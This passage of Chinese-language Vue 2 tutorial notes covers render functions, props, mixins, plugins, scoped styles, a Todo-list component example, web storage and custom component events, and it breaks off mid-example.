> 在main.js中我们看到有一行`render: h => h(App),`	App就是template
>
> 其实这行代码的完整版是
>
> ```javascript
> render(createElement) {
>     return createElement('h1', '你好')
> }
> 其中没有this指向，只有一行return，直接可以换为箭头函数
> render:(createElemet)=>createElement('h1', '你好')	//括号中的就是template模板
> ```
>
> 这行代码的作用就是调用模板解析器，因为`import Vue from 'vue'`引入的残缺的vue.js文件，不包含模板解析器。为啥引入残缺的vue.js呢？
> 因为完整版的vue.js文件由2/3的核心和1/3的模板解析器组成，在我们项目打包的时候webpack会将我们所有的vue文件解析成js文件，根本没有模板解析器什么事情，这时候带着模板解析器打包就不好。
>
> ```javascript
> /* 
> 	该文件是整个项目的入口文件
> */
> //引入Vue
> import Vue from 'vue'
> //引入App组件，它是所有组件的父组件
> import App from './App.vue'
> //关闭vue的生产提示
> Vue.config.productionTip = false
> 
> /* 
> 	关于不同版本的Vue：
> 	
> 		1.vue.js与vue.runtime.xxx.js的区别：
> 				(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。
> 				(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
> 
> 		2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用
> 			render函数接收到的createElement函数去指定具体内容。
> */
> 
> //创建Vue实例对象---vm
> new Vue({
> 	el:'#app',
> 	//render函数完成了这个功能：将App组件放入容器中
>   	render: h => h(App),
> 	// render:q=> q('h1','你好啊')
> 
> 	// template:`<h1>你好啊</h1>`,
> 	// components:{App},
> })
> ```



#### 4、修改默认配置

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=64&spm_id_from=pageDriver

> https://cli.vuejs.org/zh/config/
>
> 官网中提到的我们都可以修改
>
> vue.config.js配置文件
>
> 1、命令行使用`vue inspect > output.js`可以仅查看到Vue脚手架的默认配置。
>
> 2、在根目录下创建使用`vue.config.js`文件可以对脚手架进行个性化定制，上述网址中均有提到配置方法
>
> <img src="Akio's Book.assets/image-20220122183559547.png" alt="image-20220122183559547" style="zoom:50%;" />
>
> ```javascript
> module.exports = {
>   pages: {
>     index: {
>       //入口
>       entry: 'src/main.js',//修改入口js文件
>     },
>   },
> 	lintOnSave:false, //关闭语法检查
> }
> ```



#### 5、ref属性

> 1. 被用来给元素或子组件注册引用信息（id的替代者）
> 2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
> 3. 使用方式：
>    1. 打标识：`<h1 ref="xxx">.....</h1>` 或 `<School ref="xxx"></School>`
>    2. 获取：`this.$refs.xxx`
>
> ```vue
> <template>
> 	<div>
> 		<h1 v-text="msg" ref="title"></h1>
> 		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
> 		<School ref="sch"/>
> 	</div>
> </template>
> 
> <script>
> 	//引入School组件
> 	import School from './components/School'
> 
> 	export default {
> 		name:'App',
> 		components:{School},
> 		data() {
> 			return {
> 				msg:'欢迎学习Vue！'
> 			}
> 		},
> 		methods: {
> 			showDOM(){
> 				console.log(this.$refs.title) //真实DOM元素
> 				console.log(this.$refs.btn) //真实DOM元素
> 				console.log(this.$refs.sch) //School组件的实例对象（vc）
> 			}
> 		},
> 	}
> </script>
> ```
>
> ![image-20220122185754920](Akio's Book.assets/image-20220122185754920.png)



#### 6、props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：`<Demo name="xxx"/>`

3. 接收数据：

   1. 第一种方式（只接收）：`props:['name']`

   2. 第二种方式（限制类型）：`props:{name:String}`

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
      	name:{
      	type:String, //类型
      	required:true, //必要性
      	default:'老王' //默认值
      	}
      }
      ```

   > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

<img src="Akio's Book.assets/image-20220122200833668.png" alt="image-20220122200833668" style="zoom:67%;" />

App.vue

```vue
<template>
	<div>
		<Student name="李四" sex="女" :age="18"/>
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student}
	}
</script>
```

Student.vue

```vue
<template>
	<div>
		<h1>{{msg}}</h1>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>学生年龄：{{myAge+1}}</h2>
		<button @click="updateAge">尝试修改收到的年龄</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			console.log(this)
			return {
				msg:'I am a master',
				myAge:this.age	//prop属性不允许被修改，虽然能修改但是会有警告，但props比data能够更早的加载，所以说使用myAge:this.age，我们就可以修改这个年龄不受警告
			}
		},
		methods: {
			updateAge(){
				this.myAge++
			}
		},
		//1、简单声明接收
		// props:['name','age','sex'] 

		//2、接收的同时对数据进行类型限制
		/* props:{
			name:String,
			age:Number,
			sex:String
		} */

		//3、接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
		props:{
			name:{
				type:String, //name的类型是字符串
				required:true, //name是必要的
			},
			age:{
				type:Number,
				default:99 //默认值
			},
			sex:{
				type:String,
				required:true
			}
		}
	}
</script>
```



#### 7、mixin(混入)

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```javascript
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

    全局混入：`Vue.mixin(xxx)` 局部混入：`mixins:['xxx']`

> 示例：回合简单来说就是复用组件中重复的配置，如下将重复配置提取到mixin.js文件中，然后再School和Student中引用
>
> <img src="Akio's Book.assets/image-20220122202810738.png" alt="image-20220122202810738" style="zoom:50%;" />
>
> App.vue
>
> ```vue
> <template>
> 	<div>
> 		<School/>
> 		<hr>
> 		<Student/>
> 	</div>
> </template>
> 
> <script>
> 	import School from './components/School'
> 	import Student from './components/Student'
> 
> 	export default {
> 		name:'App',
> 		components:{School,Student}
> 	}
> </script>
> ```
>
> School.vue
>
> ```vue
> <template>
> 	<div>
> 		<h2 @click="showName">学校名称：{{name}}</h2>
> 		<h2>学校地址：{{address}}</h2>
> 	</div>
> </template>
> 
> <script>
> 	//引入一个hunhe
> 	// import {hunhe,hunhe2} from '../mixin'
> 
> 	export default {
> 		name:'School',
> 		data() {
> 			return {
> 				name:'尚硅谷',
> 				address:'北京',
> 				x:666
> 			}
> 		},
> 		// mixins:[hunhe,hunhe2],	//仅此文件混入配置
> 	}
> </script>
> ```
>
> Student.vue
>
> ```vue
> <template>
> 	<div>
> 		<h2 @click="showName">学生姓名：{{name}}</h2>
> 		<h2>学生性别：{{sex}}</h2>
> 	</div>
> </template>
> 
> <script>
> 	// import {hunhe,hunhe2} from '../mixin'
> 
> 	export default {
> 		name:'Student',
> 		data() {
> 			return {
> 				name:'张三',
> 				sex:'男'
> 			}
> 		},
> 		// mixins:[hunhe,hunhe2]
> 	}
> </script>
> ```
>
> main.js
>
> ```javascript
> //引入Vue
> import Vue from 'vue'
> //引入App
> import App from './App.vue'
> import {hunhe,hunhe2} from './mixin'	//----------
> //关闭Vue的生产提示
> Vue.config.productionTip = false
> 
> Vue.mixin(hunhe)	//--------全局混合，每个vue文件都可以获取到对应的配置
> Vue.mixin(hunhe2)
> 
> 
> //创建vm
> new Vue({
> 	el:'#app',
> 	render: h => h(App)
> })
> ```
>
> mixin.js
>
> ```javascript
> export const hunhe = {
> 	methods: {
> 		showName(){
> 			alert(this.name)
> 		}
> 	},
> 	mounted() {
> 		console.log('你好啊！')
> 	},
> }
> export const hunhe2 = {
> 	data() {
> 		return {
> 			x:100,
> 			y:200
> 		}
> 	},
> }
> ```



#### 8、插件

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

   ```javascript
   对象.install = function (Vue, options) {
       // 1. 添加全局过滤器
       Vue.filter(....)
   
       // 2. 添加全局指令
       Vue.directive(....)
   
       // 3. 配置全局混入(合)
       Vue.mixin(....)
   
       // 4. 添加实例方法
       Vue.prototype.$myMethod = function () {...}
       Vue.prototype.$myProperty = xxxx
   }
   ```

4. 使用插件：`Vue.use()`

> 示例：
>
> <img src="Akio's Book.assets/image-20220122204440856.png" alt="image-20220122204440856" style="zoom:50%;" />
>
> plugins.js 定义插件
>
> ```javascript
> export default {
> 	install(Vue,x,y,z){
> 		console.log(x,y,z)
> 		//全局过滤器
> 		Vue.filter('mySlice',function(value){
> 			return value.slice(0,4)
> 		})
> 
> 		//定义全局指令
> 		Vue.directive('fbind',{
> 			//指令与元素成功绑定时（一上来）
> 			bind(element,binding){
> 				element.value = binding.value
> 			},
> 			//指令所在元素被插入页面时
> 			inserted(element,binding){
> 				element.focus()
> 			},
> 			//指令所在的模板被重新解析时
> 			update(element,binding){
> 				element.value = binding.value
> 			}
> 		})
> 
> 		//定义混入
> 		Vue.mixin({
> 			data() {
> 				return {
> 					x:100,
> 					y:200
> 				}
> 			},
> 		})
> 
> 		//给Vue原型上添加一个方法（vm和vc就都能用了）
> 		Vue.prototype.hello = ()=>{alert('你好啊')}
> 	}
> }
> ```
>
> main.js中使用Vue.use(plugins)
>
> ```javascript
> //引入Vue
> import Vue from 'vue'
> //引入App
> import App from './App.vue'
> //引入插件
> import plugins from './plugins'
> //关闭Vue的生产提示
> Vue.config.productionTip = false
> 
> //应用（使用）插件
> Vue.use(plugins,1,2,3)
> //创建vm
> new Vue({
> 	el:'#app',
> 	render: h => h(App)
> })
> ```
>
> School.vue 具体使用
>
> ```vue
> <template>
> 	<div>
> 		<h2>学校名称：{{name | mySlice}}</h2>		//插件中的过滤器
> 		<h2>学校地址：{{address}}</h2>
> 		<button @click="test">点我测试一个hello方法</button>	//插件中的hello方法
> 	</div>
> </template>
> 
> <script>
> 	export default {
> 		name:'School',
> 		data() {
> 			return {
> 				name:'尚硅谷atguigu',
> 				address:'北京',
> 			}
> 		},
> 		methods: {
> 			test(){
> 				this.hello()
> 			}
> 		},
> 	}
> </script>
> ```
>
> Student.vue
>
> ```vue
> <template>
> 	<div>
> 		<h2>学生姓名：{{name}}</h2>
> 		<h2>学生性别：{{sex}}</h2>
> 		<input type="text" v-fbind:value="name">	//插件中的自定义指令
> 	</div>
> </template>
> 
> <script>
> 	export default {
> 		name:'Student',
> 		data() {
> 			return {
> 				name:'张三',
> 				sex:'男'
> 			}
> 		},
> 	}
> </script>
> ```



#### 9、scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：`<style scoped>`

> 示例：
>
> 如果我School.vue和Student.vue中都定义了同一个名字为demo的css样式
>
> ```vue
> <style>
> 	.demo{
> 		background-color: skyblue;//School.vue
>        	background-color: red;//Student.vue
> 	}
> </style>
> |
> |
> v
> <style scoped></style>
> ```
>
> 此时就会有样式冲突，因为vue中的样式都是作用域全局，如此我们就可以加一个 scoped表示仅作用于当前vue文件
>
> ---
>
> 还有一个lang的配置
>
> `<style lang="less" scoped></style>`
>
> 不写lang="less"默认是css，less是基于css之上的高级语言，可以嵌套写
>
> 如果你这样配置了项目跑不起来，可能是没有装less-loader
>
> 可以使用`npm view less-loader versions`命令查看其版本，一般webpack版本是4.46.0的推荐装less-loader的7.0.0，8和9的版本都是为5版本的webpack准备的
>
> <img src="Akio's Book.assets/image-20220122210530371.png" alt="image-20220122210530371" style="zoom:50%;" />
>
> 安装7的命令`npm i less-loader@7`



#### 10、Todo-list案例

> 学习这个案例主要是为了学习组件化的编码流程
>
> 组件化编码流程（通用） 
>
> 1.实现静态组件：抽取组件，使用组件实现静态页面效果 
>
> 2.展示动态数据：
> 		2.1. 数据的类型、名称是什么？ 
> 		2.2. 数据保存在哪个组件？ 
>
> 3.交互——从绑定事件监听开始
>
> <img src="Akio's Book.assets/image-20220123094013561.png" alt="image-20220123094013561" style="zoom:50%;" />
>
> <img src="Akio's Book.assets/image-20220123105453415.png" alt="image-20220123105453415" style="zoom:50%;" />
>
> App.vue
>
> ```vue
> <template>
> 	<div id="root">
> 		<div class="todo-container">
> 			<div class="todo-wrap">
> 				<MyHeader :addTodo="addTodo"/>
> 				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
> 				<MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
> 			</div>
> 		</div>
> 	</div>
> </template>
> 
> <script>
> 	import MyHeader from './components/MyHeader'
> 	import MyList from './components/MyList'
> 	import MyFooter from './components/MyFooter.vue'
> 
> 	export default {
> 		name:'App',
> 		components:{MyHeader,MyList,MyFooter},
> 		data() {
> 			return {
> 				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
> 				todos:[
> 					{id:'001',title:'抽烟',done:true},
> 					{id:'002',title:'喝酒',done:false},
> 					{id:'003',title:'开车',done:true}
> 				]
> 			}
> 		},
> 		methods: {
> 			//添加一个todo
> 			addTodo(todoObj){
> 				this.todos.unshift(todoObj)
> 			},
> 			//勾选or取消勾选一个todo
> 			checkTodo(id){
> 				this.todos.forEach((todo)=>{
> 					if(todo.id === id) todo.done = !todo.done
> 				})
> 			},
> 			//删除一个todo
> 			deleteTodo(id){
> 				this.todos = this.todos.filter( todo => todo.id !== id )
> 			},
> 			//全选or取消全选
> 			checkAllTodo(done){
> 				this.todos.forEach((todo)=>{
> 					todo.done = done
> 				})
> 			},
> 			//清除所有已经完成的todo
> 			clearAllTodo(){
> 				this.todos = this.todos.filter((todo)=>{
> 					return !todo.done
> 				})
> 			}
> 		}
> 	}
> </script>
> 
> <style>
> 	/*base*/
> 	body {
> 		background: #fff;
> 	}
> 	.btn {
> 		display: inline-block;
> 		padding: 4px 12px;
> 		margin-bottom: 0;
> 		font-size: 14px;
> 		line-height: 20px;
> 		text-align: center;
> 		vertical-align: middle;
> 		cursor: pointer;
> 		box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
> 		border-radius: 4px;
> 	}
> 	.btn-danger {
> 		color: #fff;
> 		background-color: #da4f49;
> 		border: 1px solid #bd362f;
> 	}
> 	.btn-danger:hover {
> 		color: #fff;
> 		background-color: #bd362f;
> 	}
> 	.btn:focus {
> 		outline: none;
> 	}
> 	.todo-container {
> 		width: 600px;
> 		margin: 0 auto;
> 	}
> 	.todo-container .todo-wrap {
> 		padding: 10px;
> 		border: 1px solid #ddd;
> 		border-radius: 5px;
> 	}
> </style>
> ```
>
> MyHeader.vue
>
> ```vue
> <template>
> 	<div class="todo-header">
> 		<input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
> 	</div>
> </template>
> 
> <script>
> 	import {nanoid} from 'nanoid'	//uuid的变种，nanoid更精简更短小
> 	export default {
> 		name:'MyHeader',
> 		//接收从App传递过来的addTodo
> 		props:['addTodo'],
> 		data() {
> 			return {
> 				//收集用户输入的title
> 				title:''
> 			}
> 		},
> 		methods: {
> 			add(){
> 				//校验数据
> 				if(!this.title.trim()) return alert('输入不能为空')
> 				//将用户的输入包装成一个todo对象
> 				const todoObj = {id:nanoid(),title:this.title,done:false}
> 				//通知App组件去添加一个todo对象
> 				this.addTodo(todoObj)
> 				//清空输入
> 				this.title = ''
> 			}
> 		},
> 	}
> </script>
> 
> <style scoped>
> 	/*header*/
> 	.todo-header input {
> 		width: 560px;
> 		height: 28px;
> 		font-size: 14px;
> 		border: 1px solid #ccc;
> 		border-radius: 4px;
> 		padding: 4px 7px;
> 	}
> 
> 	.todo-header input:focus {
> 		outline: none;
> 		border-color: rgba(82, 168, 236, 0.8);
> 		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
> 	}
> </style>
> ```
>
> MyList.vue
>
> ```vue
> <template>
> 	<ul class="todo-main">
> 		<MyItem 
> 			v-for="todoObj in todos"
> 			:key="todoObj.id" 
> 			:todo="todoObj" 
> 			:checkTodo="checkTodo"
> 			:deleteTodo="deleteTodo"
> 		/>
> 	</ul>
> </template>
> 
> <script>
> 	import MyItem from './MyItem'
> 
> 	export default {
> 		name:'MyList',
> 		components:{MyItem},
> 		//声明接收App传递过来的数据，其中todos是自己用的，checkTodo和deleteTodo是给子组件MyItem用的
> 		props:['todos','checkTodo','deleteTodo']
> 	}
> </script>
> 
> <style scoped>
> 	/*main*/
> 	.todo-main {
> 		margin-left: 0px;
> 		border: 1px solid #ddd;
> 		border-radius: 2px;
> 		padding: 0px;
> 	}
> 
> 	.todo-empty {
> 		height: 40px;
> 		line-height: 40px;
> 		border: 1px solid #ddd;
> 		border-radius: 2px;
> 		padding-left: 5px;
> 		margin-top: 10px;
> 	}
> </style>
> ```
>
> Myitem.vue
>
> ```vue
> <template>
> 	<li>
> 		<label>
> 			<input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
> 			<!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
> 			<!-- <input type="checkbox" v-model="todo.done"/> -->
> 			<span>{{todo.title}}</span>
> 		</label>
> 		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
> 	</li>
> </template>
> 
> <script>
> 	export default {
> 		name:'MyItem',
> 		//声明接收todo、checkTodo、deleteTodo
> 		props:['todo','checkTodo','deleteTodo'],
> 		methods: {
> 			//勾选or取消勾选
> 			handleCheck(id){
> 				//通知App组件将对应的todo对象的done值取反
> 				this.checkTodo(id)
> 			},
> 			//删除
> 			handleDelete(id){
> 				if(confirm('确定删除吗？')){
> 					//通知App组件将对应的todo对象删除
> 					this.deleteTodo(id)
> 				}
> 			}
> 		},
> 	}
> </script>
> 
> <style scoped>
> 	/*item*/
> 	li {
> 		list-style: none;
> 		height: 36px;
> 		line-height: 36px;
> 		padding: 0 5px;
> 		border-bottom: 1px solid #ddd;
> 	}
> 
> 	li label {
> 		float: left;
> 		cursor: pointer;
> 	}
> 
> 	li label li input {
> 		vertical-align: middle;
> 		margin-right: 6px;
> 		position: relative;
> 		top: -1px;
> 	}
> 
> 	li button {
> 		float: right;
> 		display: none;
> 		margin-top: 3px;
> 	}
> 
> 	li:before {
> 		content: initial;
> 	}
> 
> 	li:last-child {
> 		border-bottom: none;
> 	}
> 
> 	li:hover{
> 		background-color: #ddd;
> 	}
> 	
> 	li:hover button{ /* 鼠标悬浮的时候删除按钮显示 */
> 		display: block;
> 	}
> </style>
> ```
>
> MyFooter.vue
>
> ```vue
> <template>
> 	<div class="todo-footer" v-show="total">
> 		<label>
> 			<!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
> 			<input type="checkbox" v-model="isAll"/>
> 		</label>
> 		<span>
> 			<span>已完成{{doneTotal}}</span> / 全部{{total}}
> 		</span>
> 		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
> 	</div>
> </template>
> 
> <script>
> 	export default {
> 		name:'MyFooter',
> 		props:['todos','checkAllTodo','clearAllTodo'],
> 		computed: {
> 			//总数
> 			total(){
> 				return this.todos.length
> 			},
> 			//已完成数
> 			doneTotal(){
> 				//此处使用reduce方法做条件统计
> 				/* const x = this.todos.reduce((pre,current)=>{
> 					console.log('@',pre,current)
> 					return pre + (current.done ? 1 : 0)
> 				},0) */
> 				//简写,数组中的属性方法reduce可以去https://developer.mozilla.org/zh-CN/ 看看方法
> 				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
> 			},
> 			//控制全选框
> 			// isAll(){ return this.doneTotal === this.total && this.total > 0 }
> 			isAll:{
> 				//全选框是否勾选
> 				get(){
> 					return this.doneTotal === this.total && this.total > 0
> 				},
> 				//isAll被修改时set被调用
> 				set(value){
> 					this.checkAllTodo(value)
> 				}
> 			}
> 		},
> 		methods: {
> 			/* checkAll(e){
> 				this.checkAllTodo(e.target.checked)
> 			} */
> 			//清空所有已完成
> 			clearAll(){
> 				this.clearAllTodo()
> 			}
> 		},
> 	}
> </script>
> 
> <style scoped>
> 	/*footer*/
> 	.todo-footer {
> 		height: 40px;
> 		line-height: 40px;
> 		padding-left: 6px;
> 		margin-top: 5px;
> 	}
> 
> 	.todo-footer label {
> 		display: inline-block;
> 		margin-right: 20px;
> 		cursor: pointer;
> 	}
> 
> 	.todo-footer label input {
> 		position: relative;
> 		top: -1px;
> 		vertical-align: middle;
> 		margin-right: 5px;
> 	}
> 
> 	.todo-footer button {
> 		float: right;
> 		margin-top: 5px;
> 	}
> </style>
> ```
>
> **总结TodoList案例**
>
> 1. 组件化编码流程：
>
>     (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。
>
>     (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：
>
>     1).一个组件在用：放在组件自身即可。
>
>     2). 一些组件在用：放在他们共同的父组件上（状态提升）。
>
>     (3).实现交互：从绑定事件开始。
>
> 2. props适用于：
>
>     (1).父组件 ==> 子组件 通信
>
>     (2).子组件 ==> 父组件 通信（要求父先给子一个函数）
>
> 3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！
>
> 4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。



#### 11、webStorage

> 1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）
>
> 2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。
>
> 3. 相关API：
>
>    1. `xxxxxStorage.setItem('key', 'value');` 该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。
>
>    2. `xxxxxStorage.getItem('person');`
>
>        该方法接受一个键名作为参数，返回键名对应的值。
>
>    3. `xxxxxStorage.removeItem('key');`
>
>        该方法接受一个键名作为参数，并把该键名从存储中删除。
>
>    4. `xxxxxStorage.clear()`
>
>        该方法会清空存储中的所有数据。
>
> 4. 备注：
>
>    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
>    2. LocalStorage存储的内容，需要手动清除才会消失。
>    3. `xxxxxStorage.getItem(xxx)`如果xxx对应的value获取不到，那么getItem的返回值是null。
>    4. `JSON.parse(null)`的结果依然是null。
>
> ---
>
> WebStorage分为两类
>
> - localStorage 本地存储
>
>   ```html
>   <!DOCTYPE html>
>   <html>
>   	<head>
>   		<meta charset="UTF-8" />
>   		<title>localStorage</title>
>   	</head>
>   	<body>
>   		<h2>localStorage</h2>
>   		<button onclick="saveData()">点我保存一个数据</button>
>   		<button onclick="readData()">点我读取一个数据</button>
>   		<button onclick="deleteData()">点我删除一个数据</button>
>   		<button onclick="deleteAllData()">点我清空一个数据</button>
>   
>   		<script type="text/javascript" >
>   			let p = {name:'张三',age:18}
>   
>   			function saveData(){
>   				localStorage.setItem('msg','hello!!!')
>   				localStorage.setItem('msg2',666)
>   				localStorage.setItem('person',JSON.stringify(p))
>   			}
>   			function readData(){
>   				console.log(localStorage.getItem('msg'))
>   				console.log(localStorage.getItem('msg2'))
>   
>   				const result = localStorage.getItem('person')
>   				console.log(JSON.parse(result))
>   
>   				// console.log(localStorage.getItem('msg3'))
>   			}
>   			function deleteData(){
>   				localStorage.removeItem('msg2')
>   			}
>   			function deleteAllData(){
>   				localStorage.clear()
>   			}
>   		</script>
>   	</body>
>   </html>
>   ```
>
> - SessionStorage
>
>   ```html
>   <!DOCTYPE html>
>   <html>
>   	<head>
>   		<meta charset="UTF-8" />
>   		<title>sessionStorage</title>
>   	</head>
>   	<body>
>   		<h2>sessionStorage</h2>
>   		<button onclick="saveData()">点我保存一个数据</button>
>   		<button onclick="readData()">点我读取一个数据</button>
>   		<button onclick="deleteData()">点我删除一个数据</button>
>   		<button onclick="deleteAllData()">点我清空一个数据</button>
>         
>   		<script type="text/javascript" >
>   			let p = {name:'张三',age:18}
>         
>   			function saveData(){
>   				sessionStorage.setItem('msg','hello!!!')
>   				sessionStorage.setItem('msg2',666)
>   				sessionStorage.setItem('person',JSON.stringify(p))
>   			}
>   			function readData(){
>   				console.log(sessionStorage.getItem('msg'))
>   				console.log(sessionStorage.getItem('msg2'))
>         
>   				const result = sessionStorage.getItem('person')
>   				console.log(JSON.parse(result))
>         
>   				// console.log(sessionStorage.getItem('msg3'))
>   			}
>   			function deleteData(){
>   				sessionStorage.removeItem('msg2')
>   			}
>   			function deleteAllData(){
>   				sessionStorage.clear()
>   			}
>   		</script>
>   	</body>
>   </html>
>   ```
>
> ---
>
> 学习了本地存储，我们可以将TODO-list案例更改为本地存储
>
> App.vue
>
> ```vue
> <template>
> 	<div id="root">
> 		<div class="todo-container">
> 			<div class="todo-wrap">
> 				<MyHeader :addTodo="addTodo"/>
> 				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
> 				<MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
> 			</div>
> 		</div>
> 	</div>
> </template>
> 
> <script>
> 	import MyHeader from './components/MyHeader'
> 	import MyList from './components/MyList'
> 	import MyFooter from './components/MyFooter.vue'
> 
> 	export default {
> 		name:'App',
> 		components:{MyHeader,MyList,MyFooter},
> 		data() {
> 			return {
> 				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
> 				todos:JSON.parse(localStorage.getItem('todos')) || []	//----
> 			}
> 		},
> 		methods: {
> 			//添加一个todo
> 			addTodo(todoObj){
> 				this.todos.unshift(todoObj)
> 			},
> 			//勾选or取消勾选一个todo
> 			checkTodo(id){
> 				this.todos.forEach((todo)=>{
> 					if(todo.id === id) todo.done = !todo.done
> 				})
> 			},
> 			//删除一个todo
> 			deleteTodo(id){
> 				this.todos = this.todos.filter( todo => todo.id !== id )
> 			},
> 			//全选or取消全选
> 			checkAllTodo(done){
> 				this.todos.forEach((todo)=>{
> 					todo.done = done
> 				})
> 			},
> 			//清除所有已经完成的todo
> 			clearAllTodo(){
> 				this.todos = this.todos.filter((todo)=>{
> 					return !todo.done
> 				})
> 			}
> 		},
> 		watch: {	//--------------
> 			todos:{
> 				deep:true,
> 				handler(value){
> 					localStorage.setItem('todos',JSON.stringify(value))
> 				}
> 			}
> 		},
> 	}
> </script>
> 
> <style>
> 	/*base*/
> 	body {
> 		background: #fff;
> 	}
> 	.btn {
> 		display: inline-block;
> 		padding: 4px 12px;
> 		margin-bottom: 0;
> 		font-size: 14px;
> 		line-height: 20px;
> 		text-align: center;
> 		vertical-align: middle;
> 		cursor: pointer;
> 		box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
> 		border-radius: 4px;
> 	}
> 	.btn-danger {
> 		color: #fff;
> 		background-color: #da4f49;
> 		border: 1px solid #bd362f;
> 	}
> 	.btn-danger:hover {
> 		color: #fff;
> 		background-color: #bd362f;
> 	}
> 	.btn:focus {
> 		outline: none;
> 	}
> 	.todo-container {
> 		width: 600px;
> 		margin: 0 auto;
> 	}
> 	.todo-container .todo-wrap {
> 		padding: 10px;
> 		border: 1px solid #ddd;
> 		border-radius: 5px;
> 	}
> </style>
> ```
>



#### 12、组件的自定义事件

1. 一种组件间通信的方式，适用于：**子组件 ===> 父组件**

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：`<Demo @atguigu="test"/>` 或 `<Demo v-on:atguigu="test"/>`

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="xxx"/>
      ......
      mounted(){
         this.$refs.xxx.$on('atguigu',this.test)
         this.$refs.xxx.$once('atguigu',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法。

4. 触发自定义事件：`this.$emit('atguigu',数据)`

5. 解绑自定义事件`this.$off('atguigu')`

6. 组件上也可以绑定原生DOM事件，需要使用`native`修饰符。可能会出现你使用自定义组件`@click`会认为这就是自定义组件

7. 注意：通过`this.$refs.xxx.$on('atguigu',回调)`绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题！

> App.vue
>
> ```vue
> <template>
> 	<div class="app">
> 		<h1>{{msg}}，学生姓名是:{{studentName}}</h1>
> 
> 		<!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 --><!-- 非自定义组件 -->
> 		<School :getSchoolName="getSchoolName"/>
> 
> 		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） -->
> 		<!-- <Student @atguigu="getStudentName" @demo="m1"/> -->
> 
> 		<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
> 		<Student ref="student" @click.native="show"/>
> 	</div>
> </template>
> 
> <script>
> 	import Student from './components/Student'
> 	import School from './components/School'
> 
> 	export default {
> 		name:'App',
> 		components:{School,Student},
> 		data() {
> 			return {
> 				msg:'你好啊！',
> 				studentName:''
> 			}
> 		},
> 		methods: {
> 			getSchoolName(name){
> 				console.log('App收到了学校名：',name)
> 			},
> 			getStudentName(name,...params){//
> 				console.log('App收到了学生名：',name,params)
> 				this.studentName = name
> 			},
> 			m1(){
> 				console.log('demo事件被触发了！')
> 			},
> 			show(){
> 				alert(123)
> 			}
> 		},
> 		mounted() {
> 			this.$refs.student.$on('atguigu',this.getStudentName) //绑定自定义事件
> 			// this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
> 		},
> 	}
> </script>
> 
> <style scoped>
> 	.app{
> 		background-color: gray;
> 		padding: 5px;
> 	}
> </style>
> ```
>
> Student.vue
>
> ```vue
> <template>
> 	<div class="student">
> 		<h2>学生姓名：{{name}}</h2>
> 		<h2>学生性别：{{sex}}</h2>
> 		<h2>当前求和为：{{number}}</h2>
> 		<button @click="add">点我number++</button>
> 		<button @click="sendStudentlName">把学生名给App</button>
> 		<button @click="unbind">解绑atguigu事件</button>
> 		<button @click="death">销毁当前Student组件的实例(vc)</button>
> 	</div>
> </template>
> 
> <script>
